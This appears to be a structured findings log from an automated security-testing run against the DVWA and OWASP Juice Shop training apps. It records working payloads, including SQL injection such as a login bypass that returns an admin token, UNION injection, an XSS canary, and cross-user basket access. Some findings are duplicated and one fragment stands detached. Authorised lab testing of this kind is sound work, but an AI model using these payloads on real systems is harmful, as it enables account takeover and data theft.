findings.title: Stored XSS canary via guestbook message field (DVWA, security=low) - not executed
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) -> 200, form txtName maxlength=10, mtxMessage maxlength=50
POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) txtName=xssv&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook -> 200, entry rendered
findings.response_evidence: Canary (50 chars, exactly at mtxMessage maxlength) was accepted and the entry was rendered as 'Name: xssv / Message: window.xss_flag=1'. The <script id="test_token"> element is absent from the rendered DOM (document.querySelector('#test_token') = null) and window.xss_flag evaluates to undefined (not 1). The script tag wrapper was stripped server-side or in rendering, so no script execution occurred. Not confirmed. Note: session_info reports security_level=low, but the page footer text reads 'Security Level: high', a level-state discrepancy worth noting for the Coordinator.

findings.title: DVWA security-level control endpoint (/security.php) - not a listed verification class
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) -> session_info.security_level=low; page footer 'Security Level: high'
findings.response_evidence: CWE-653 (insufficient compartmentalization) does not map to any of the behavioral verification classes assigned for this run, so no behavioral check was performed on /security.php. It is needed only as a state-setting helper for the DVWA benchmark levels. Observed inconsistency: session_info reports security_level=low while the page footer reads 'Security Level: high'. The Coordinator should decide whether to return this to Surface Mapper or pursue a separate check.

findings.title: DVWA SQL Injection (numeric boolean, POST id) [security=medium]
request_sequence: POST http://dvwa/security.php (dvwa_admin) security=medium, seclev_submit=Submit, user_token=[REDACTED] -> 302 to /security.php
GET http://dvwa/vulnerabilities/sqli/ (dvwa_admin) -> page shows 'Security level set to medium'
findings.response_evidence: [security=medium] TRUE 'id=1 OR 1=1' -> HTTP 200 with 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE 'id=1 AND 1=2' -> HTTP 200 with zero user records (only the 'User ID: 1 2 3 4 5' header). Numeric boolean injection without quotes works at medium; the id field is POSTed and quote-escaped as expected. Page footer: 'Security Level: medium'. Note: session_info metadata still reported 'low' while page reported medium; the page content was used as the authoritative level.

findings.title: DVWA security-level setter (POST /security.php) - no exploitable weakness verified
request_sequence: GET http://dvwa/vulnerabilities/sqli/ (dvwa_admin) -> 'Security level set to medium'
findings.response_evidence: The level-change endpoint works as designed: a POST with the page's CSRF user_token changed the level to medium (confirmed by the subsequent page message and footer). This is a control-plane function and does not by itself expose a security impact; the CWE-653 suspicion (improper isolation/separation of privileges) was not behaviorally demonstrated. Not tested: whether the endpoint accepts requests without a valid user_token or from cross-origin contexts (CSRF), and whether non-admin sessions can change the level. Recommend the Coordinator decide whether to pursue those checks.

findings.title: Juice Shop product search SQL injection (q parameter) - error-based and UNION-based
request_sequence: GET /rest/products/search?q=qwert' (unauth) -> 500 text/html 'Error: SQLITE_ERROR: near "'%'": syntax error'
findings.response_evidence: Benign q=apple returns 200 with two real products and no error. A single quote (q=qwert') returns HTTP 500 with 'SQLITE_ERROR: near "'%'": syntax error', proving the quote breaks out of the SQL string. The 9-column UNION payload returns HTTP 200 with the attacker-chosen literals (2,3,4,...,9) reflected in the product fields, proving arbitrary UNION SELECT data injection into the query result. Unauthenticated.

findings.title: Juice Shop unauthenticated /api/Feedbacks exposes user-linked feedback with partially masked author emails
findings.response_evidence: Unauthenticated request returns HTTP 200 with 8 feedback records, each with UserId and comment text. Authors' emails appear only in partially masked form inside the comment text, e.g. '(***in@juice-sh.op)', '(***ereum@juice-sh.op)', '(***@juice-sh.op)'; anonymous records have UserId null and '(anonymous)'. The endpoint is accessible without authentication and leaks user-association and partial email fragments/domain, but full author email addresses are not disclosed, so the stated CWE-359 criterion (disclosure of author email addresses) is not fully met. Recommend Coordinator decide whether partial masking qualifies as PII exposure; the unmasked-email criterion is not proven.

findings.title: Cross-user basket access (BOLA) on /rest/basket/{basketId}: acct2 reads acct1's basket
findings.response_evidence: acct1 (own basket 6) response: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"quantity":3}}]}}. acct2 (own basket 7, UserId differs) request for basket 6 returned HTTP 200 with identical body: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"quantity":3}}]}}. Account 2 retrieved Account 1's basket and its distinct seeded item (Apple Juice (1000ml), quantity 3). No ownership check enforced.

findings.title: Unauthenticated access to user feedback records on /api/Feedbacks (author identity partially exposed; full emails not disclosed)
findings.response_evidence: Unauthenticated HTTP 200 {"status":"success","data":[...8 records...]} with no auth. Records include UserId (1,2,3,21, or null for anonymous) and comments with author emails masked: e.g. "(***in@juice-sh.op)", "(***ereum@juice-sh.op)". Anonymous entries show "(anonymous)". Unauthenticated access to feedback records is confirmed, but full author email addresses are NOT disclosed (only masked fragments with domain), so the stated PII criterion (disclosure of author email addresses) is not fully met. Marked inconclusive; partial identifier leakage (UserId, masked email fragments) noted for Coordinator.

Identical to acct1's own response. Account 2 retrieved Account 1's distinct seeded item (Apple Juice (1000ml), qty 3) with no ownership check.

findings.title: Login authentication-bypass SQL injection via email field on POST /rest/user/login
request_sequence: POST http://juiceshop:3000/rest/user/login (session unauth) Content-Type: application/json, body: {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 with {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid session token was issued for the first user (admin@juice-sh.op) without valid credentials, confirming SQL injection in the email field bypassing authentication.
